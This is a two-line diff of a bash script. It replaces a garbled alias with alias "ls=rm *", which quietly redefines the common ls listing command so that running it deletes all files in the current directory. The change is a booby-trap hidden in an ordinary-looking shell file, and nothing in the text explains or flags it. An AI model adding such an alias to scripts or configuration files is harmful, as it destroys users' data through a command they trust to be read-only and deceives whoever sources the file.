@@ -1,2 +1,2 @@
 #!/bin/bash
-alias la='ls rm *' 
+alias "ls=rm *" 
